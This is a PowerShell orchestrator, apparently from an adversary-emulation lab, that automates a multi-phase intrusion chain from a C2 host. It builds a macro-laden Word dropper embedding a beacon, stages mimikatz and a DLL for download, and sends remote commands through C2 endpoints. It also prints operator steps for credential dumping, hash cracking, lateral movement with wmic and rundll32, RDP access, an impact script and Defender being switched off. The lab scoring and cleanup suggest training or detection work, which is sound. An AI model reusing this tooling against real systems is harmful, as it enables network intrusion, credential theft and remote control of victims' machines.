<#
C0015 — Campaign orchestrator, phases 1-3. RUN ON THE C2 HOST (192.168.50.1), repo root, PowerShell 5.1+.

Automates every beacon/server/artifact step of the chain; prints the steps that only a
human can do (opening test.docm, runas/net-use password prompts). No secrets anywhere.

Actions:
  Pre          generate per-run config + start lab servers, print the WS01 staging steps
  WaitSession  poll GET /sessions until the phase3 (session 1) token appears
  P1           verify phase 1 (register ok + markers checklist + token)
  P2           enqueue the phase-2 runbook (11 entries) and wait for it to drain, create
               artifact templates, print the interactive S5-S8 steps, then WAIT for the
               ART-07-01 (session 2) receipt
  P3           print phase-3 guided steps (S10 manifest / S11 sink note / S12 RDP / S13 /
               S14 impact / S15 score) + cleanup
  Artifacts    print the artifact-new one-liners for this run
  All          Pre -> WaitSession -> P1 -> P2 -> P3
  Stop         stop the lab servers

Usage:
  pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action All
  pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -RunId RUN-20260928-02 -Action P2
#>
[CmdletBinding()]
param(
    [string]$RunId = '',
    [string]$C2Ip = '192.168.50.1',
    [int]$C2Port = 8080,
    [int]$HttpPort = 8000,
    [ValidateSet('Pre', 'WaitSession', 'P1', 'P2', 'P3', 'Artifacts', 'Cmd', 'Run', 'Results', 'All', 'Stop')]
    [string]$Action = 'All',
    [string]$Staging = 'stage/ws01',
    [string]$Body = '',
    [int]$TimeoutSeconds = 300
)
$ErrorActionPreference = 'Stop'
$repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName
$C2 = "http://${C2Ip}:${C2Port}"
$ledger = Join-Path $repo 'evidence/run-ledger'
$logPath = Join-Path $repo 'c2sim.log'

function Step { param([string]$m) Write-Host $m -ForegroundColor Cyan }
function Wait-Key { Read-Host '   ... Enter de tiep tuc (Ctrl+C de dung)' | Out-Null }
function Get-Phase3Token {
    ((Invoke-RestMethod "$C2/sessions") | Where-Object { $_.stage -eq 'phase3' } | Select-Object -First 1).token
}

function Invoke-Run {
    # Remote operator: push a command via /cmd and read its OUTPUT at C2 (/last).
    param([string]$Command)
    $t = Get-Phase3Token
    if (-not $t) { throw 'no phase3 session' }
    Invoke-RestMethod -Method Post -Uri "$C2/cmd?session=$t" -Body $Command | Out-Null
    Step "current=$Command"
    $deadline = (Get-Date).AddSeconds(40)
    $last = $null
    do {
        Start-Sleep 2
        try { $last = Invoke-RestMethod "$C2/last?session=$t" } catch { $last = $null }
    } until (
        ($null -ne $last) -and ($last.task -eq 'OP-CMD') -and (-not [string]::IsNullOrEmpty($last.output)) -or
        (Get-Date) -gt $deadline
    )
    if ($null -ne $last -and $last.output) {
        Step ("output (task=$($last.task) bytes=$($last.bytes)):")
        $last.output
    } else { Step 'chua co output (beacon co song khong?)' }
}

function Show-Results {
    # Remote operator: print the last N command outputs stored on the C2 server.
    $t = Get-Phase3Token
    $r = Invoke-RestMethod "$C2/results?session=$t&n=20"
    foreach ($x in $r) {
        "--- task=$($x.task) utc=$($x.utc) bytes=$($x.bytes) ---"
        $x.output
    }
}

function Wait-Listeners {
    foreach ($port in 8080, 8000) {
        $deadline = (Get-Date).AddSeconds(15)
        $ok = $null
        do {
            $ok = Get-NetTCPConnection -State Listen -LocalPort $port -ErrorAction SilentlyContinue
            if (-not $ok) { Start-Sleep -Milliseconds 500 }
        } until ($ok -or (Get-Date) -gt $deadline)
        if ($ok) { Step ("LISTENER OK: {0}:{1}" -f (($ok | Select-Object -First 1).LocalAddress), $port) }
        else { Step "LISTENER MISSING: port $port - kiem tra http.server / c2sim" }
    }
}

function Start-Phase {
    Step '== Pre: config + servers =='
    $cfg = Join-Path $repo "$Staging/config.ini"
    & (Join-Path $repo 'payloads/packaging/make_config.ps1') -RunId $RunId -C2Host $C2Ip -OutPath $cfg | Out-Null
    Copy-Item (Join-Path $repo 'payloads/hta/bootstrap.hta') (Join-Path $repo $Staging) -Force
    Copy-Item (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') (Join-Path $repo $Staging) -Force
    Copy-Item (Join-Path $repo 'payloads/config/c0015-phase7.example.ini') (Join-Path $repo "$Staging/config-phase7.ini") -Force
    # rerun-v2: build the self-contained macro (embeds config+hta+beacon) so WS01
    # holds NO staged tooling before the victim opens test.docm.
    & (Join-Path $repo 'payloads/packaging/gen_macro_embedded.ps1') `
        -Config (Join-Path $repo "$Staging/config.ini") `
        -Hta  (Join-Path $repo 'payloads/hta/bootstrap.hta') `
        -Beacon (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') `
        -OutPath (Join-Path $repo "$Staging/macro_embedded.vba") | Out-Null
    Step "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
    # rerun-v2 T1105: stage the phase-2 tooling under build/out/tools so the beacon
    # can fetch mimikatz/143.dll/beacon/config-phase7 over :8000 (no direct drops).
    $toolsDir = Join-Path $repo 'build/out/tools'
    New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
    foreach ($t in @('mimikatz.exe', 'c0015_143_surrogate.dll', 'c0015_beacon.ps1', 'config-phase7.ini')) {
        $src = Join-Path $repo "$Staging/$t"
        if (Test-Path $src) { Copy-Item $src (Join-Path $toolsDir $t) -Force }
        else { Step "TOOLS MISSING (build/deploy truoc): $Staging\$t" }
    }
    & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir 'build/out' | Out-Null
    Wait-Listeners
    Step '== WS01 (rerun-v2, remote via vmrun): install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba =='
    Step '== WS01: mo test.docm (victim action; macros enabled qua Trust Center preflight) =='
    Step 'Sau khi mo xong, chay -Action P1 / P2.'
}

function Wait-Session {
    Step '== WaitSession: cho session 1 (phase3) =='
    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    $t = $null
    do {
        Start-Sleep 5
        try { $t = Get-Phase3Token } catch { }
    } until ($t -or (Get-Date) -gt $deadline)
    if ($t) { Step "SESSION1 TOKEN: $t" } else { throw 'Het time - chua thay session phase3 (mo test.docm chua?)' }
}

function Check-Phase1 {
    Step '== P1: verify phase 1 =='
    $reg = Select-String -Path $logPath -Pattern 'register stage=phase3 host=WS01 .*ok=True' -ErrorAction SilentlyContinue
    if ($reg) { Step "REGISTER OK: $($reg.Line)" } else { Step 'CHUA THAY register ok - mo test.docm tren WS01.' }
    Step 'Markers tren WS01 (kiem tra tay): b64-marker.txt, js-marker.txt, c0015-comparefor.jpg, dll-executed.txt'
    Step "Token: $(Get-Phase3Token)"
}

function New-ArtifactTemplates {
    $dir = Join-Path $repo $Staging
    @{
        'found_shares.json' = @{ host = 'FS01'; share = 'Finance'; readable = $true; sample_files = @('budget-q3.txt', 'payroll-notes.txt') }
        'target-manifest.json' = @{ target = @{ host = 'FS01'; ip = '192.168.50.30'; share = 'Finance'; selection_reason = 'TBD - fill from ART-04-01' }; auth = @{ account = 'C0015\it.admin' } }
        'auth-bundle.json' = @{ controls = @(@{ account = 'duc.user'; result = 'denied' }, @{ account = 'it.admin'; result = 'allowed' }) }
        'remote-process.json' = @{ target = @{ host = 'FS01' }; identity = @{ account = 'C0015\it.admin' }; dll = @{ path = 'C:\C0015\c0015_143_surrogate.dll'; sha256 = 'TBD' } }
    }.GetEnumerator() | ForEach-Object {
        $p = Join-Path $dir $_.Key
        if (-not (Test-Path $p)) { $_.Value | ConvertTo-Json -Depth 5 | Set-Content -Path $p -Encoding UTF8 }
    }
    Step "Artifact templates: $dir\*.json (fill TBD truoc khi artifact-new)."
}

function Invoke-Phase2 {
    Step '== P2: runbook phase2 (11 entries) =='
    $t = Get-Phase3Token
    if (-not $t) { Wait-Session; $t = Get-Phase3Token }
    Invoke-RestMethod -Method Post -Uri "$C2/runbook?session=$t&name=c0015-phase2" | Out-Null
    Step 'Runbook enqueued. Cho beacon chay (11 OP-CMD)...'
    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    $s = $null
    do {
        Start-Sleep 5
        $s = (Invoke-RestMethod "$C2/sessions" | Where-Object { $_.token -eq $t })
    } until (($s.queue_len -eq 0 -and $s.tasks_done -ge 11) -or (Get-Date) -gt $deadline)
    Step ("Runbook: queue={0} tasks_done={1}" -f $s.queue_len, $s.tasks_done)
    New-ArtifactTemplates
    Step '== Interactive steps (WS01) - lam roi Enter de tiep tuc =='
    Step ' S5 artifact  : pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Artifacts -RunId <RUN>  (ART-04-01)'
    Step ' S6           : ART-04-02 (art04_02.json da co template)'
    Step ' S7           : net use A/B/C (chay payloads/packaging/run_ws01_operator.ps1 -Step S7) - giu ket noi B'
    Step ' S7b          : mimikatz dump tren WS01 -> NTLM it.admin -> crack tren Kali (hashcat -m 1000) -> giu plaintext'
    Step ' S8a          : copy 143.dll + beacon + config-phase7 -> \\FS01\C$\C0015\'
    Step ' S8b          : runas it.admin "wmic /node:FS01 process call create rundll32 ..." (dung plaintext CRACKED)'
    Wait-Key
    Step '== Cho receipt ART-07-01 (session 2 tren FS01) =='
    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    $rc = $null
    do {
        Start-Sleep 5
        $rc = Get-ChildItem $ledger -Filter 'ART-07-01-*.json' -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
    } until ($rc -or (Get-Date) -gt $deadline)
    if ($rc) { Step "RECEIPT OK: $($rc.Name)" } else { Step 'Chua thay receipt - kiem tra FS01 callback (E3 :8080, E7 hash).' }
}

function Invoke-Phase3 {
    Step '== P3: guided phase 3 =='
    Step 'S10 (FS01 session2): doc corpus \\FS01\IT roi tren C2 host:'
    Step "   python scripts/lab_tools.py manifest-new <corpus_dir> $RunId -o stage\ws01\art08_01.json"
    Step "S11: sink chua co trong repo (p5_sink) -> muon chay can sink; offline: python scripts/lab_tools.py receipt-check <receipt> <manifest> <allowlist>"
    Step 'S12 (RDP): mstsc /v:FS01 (it.admin) - can DET-008 define'
    Step 'S13 (AnyDesk-like): manual - install portable app vao path dac biet; LSASS branch = fixtures/replay'
    Step "S14 (impact, FS01 co ban repo): pwsh -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare|Run|Verify|Rollback|Verify"
    Step "S15: python scripts/lab_tools.py score <ground_truth> <reconstruction>"
    Step 'Cleanup: -Action Stop; xoa artifacts WS01/FS01; bat lai Defender.'
}

function Print-Artifacts {
    @"
ART-04-01 : python scripts/lab_tools.py artifact-new ART-04-01 $RunId 5 6 --payload stage/ws01/found_shares.json  -o stage/ws01/art04_01.json
ART-04-02 : python scripts/lab_tools.py artifact-new ART-04-02 $RunId 6 8 --payload stage/ws01/target-manifest.json -o stage/ws01/art04_02.json
ART-05-01 : python scripts/lab_tools.py artifact-new ART-05-01 $RunId 5 6 --payload stage/ws01/auth-bundle.json     -o stage/ws01/art05_01.json
ART-06-01 : python scripts/lab_tools.py artifact-new ART-06-01 $RunId 6 7 --payload stage/ws01/remote-process.json  -o stage/ws01/art06_01.json
"@ | Write-Host
}

function Stop-Servers {
    & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -Stop | Out-Null
    Step 'Servers stopped.'
}

switch ($Action) {
    'Pre' { Start-Phase }
    'WaitSession' { Wait-Session }
    'P1' { Check-Phase1 }
    'Cmd' { $t = Get-Phase3Token; Invoke-RestMethod -Method Post -Uri "$C2/cmd?session=$t" -Body $Body | Out-Null; "queued ($Action): $Body" }
    'Run' { Invoke-Run -Command $Body }
    'Results' { Show-Results }
    'P2' { Invoke-Phase2 }
    'P3' { Invoke-Phase3 }
    'Artifacts' { Print-Artifacts }
    'Stop' { Stop-Servers }
    'All' {
        Start-Phase
        Wait-Session
        Check-Phase1
        Invoke-Phase2
        Invoke-Phase3
    }
}